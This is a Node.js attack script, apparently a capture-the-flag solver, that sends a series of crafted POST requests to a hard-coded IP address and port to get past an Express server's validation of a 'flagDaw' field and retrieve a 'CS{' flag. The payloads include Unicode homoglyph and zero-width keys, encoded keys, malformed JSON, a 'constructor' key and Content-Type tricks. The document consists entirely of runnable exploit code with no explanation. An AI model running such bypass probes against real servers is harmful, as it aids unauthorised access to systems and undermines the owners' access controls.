const http = require('http');

const url = new URL('http://49.213.52.6:6969/');

// Try to bypass Express body-parser validation
// Maybe the server checks req.body but we can send it differently
const tests = [
  {
    name: 'flagDaw with unicode zero-width joiner',
    data: JSON.stringify({ 'flag\u200dDaw': true })
  },
  {
    name: 'flagDaw with unicode variation selector',
    data: JSON.stringify({ 'flag\uFE00Daw': true })
  },
  {
    name: 'flagDaw with different unicode characters that look similar',
    data: JSON.stringify({ 'flag\u0434aw': true }) // Cyrillic 'd'
  },
  {
    name: 'flagDaw with full-width characters',
    data: JSON.stringify({ 'flagＤaw': true })
  },
  {
    name: 'Double encoding the key',
    data: JSON.stringify({ [encodeURIComponent('flagDaw')]: true })
  },
  {
    name: 'flagDaw as number key (should fail but try)',
    data: '{"1":true}' // This won't work but let's see
  },
  {
    name: 'Send as URL-encoded then JSON',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    data: 'json=' + encodeURIComponent(JSON.stringify({ flagDaw: true }))
  },
  {
    name: 'Try with different boolean representation',
    data: '{"flagDaw":1}'
  },
  {
    name: 'Try with string "true"',
    data: '{"flagDaw":"true"}'
  },
  {
    name: 'Try with capital True',
    data: '{"flagDaw":True}' // Invalid JSON but let's see
  },
  {
    name: 'Try bypassing with __proto__ or constructor',
    data: JSON.stringify({ flagDaw: true, constructor: {} })
  },
  {
    name: 'Try with Content-Type text/json',
    headers: { 'Content-Type': 'text/json' },
    data: JSON.stringify({ flagDaw: true })
  },
  {
    name: 'Try with Content-Type text/json; charset=utf-8',
    headers: { 'Content-Type': 'text/json; charset=utf-8' },
    data: JSON.stringify({ flagDaw: true })
  }
];

async function testRequest(test) {
  return new Promise((resolve) => {
    const defaultHeaders = {
      'Content-Length': Buffer.byteLength(test.data),
      'Referer': 'http://49.213.52.6:6969/',
      'Origin': 'http://49.213.52.6:6969/',
      'Accept': '*/*'
    };
    
    const options = {
      hostname: url.hostname,
      port: url.port,
      path: url.pathname,
      method: 'POST',
      headers: {
        ...defaultHeaders,
        ...(test.headers || { 'Content-Type': 'text/plain;charset=UTF-8' })
      }
    };

    const req = http.request(options, (res) => {
      let responseData = '';
      res.on('data', (chunk) => {
        responseData += chunk;
      });
      res.on('end', () => {
        resolve({ 
          name: test.name, 
          status: res.statusCode, 
          response: responseData,
          headers: res.headers
        });
      });
    });

    req.on('error', (e) => {
      resolve({ name: test.name, error: e.message });
    });

    req.write(test.data);
    req.end();
  });
}

(async () => {
  console.log('Testing Express.js raw body and encoding bypasses...\n');
  
  for (const test of tests) {
    const result = await testRequest(test);
    console.log(`\n${test.name}:`);
    console.log(`  Status: ${result.status || 'Error'}`);
    const response = (result.response || result.error || '').substring(0, 150);
    console.log(`  Response: ${response}${(result.response || '').length > 150 ? '...' : ''}`);
    
    if (result.response && result.response.includes('CS{')) {
      console.log('\n*** FLAG FOUND ***');
      console.log('FLAG:', result.response);
      break;
    }
    
    await new Promise(r => setTimeout(r, 300));
  }
})();

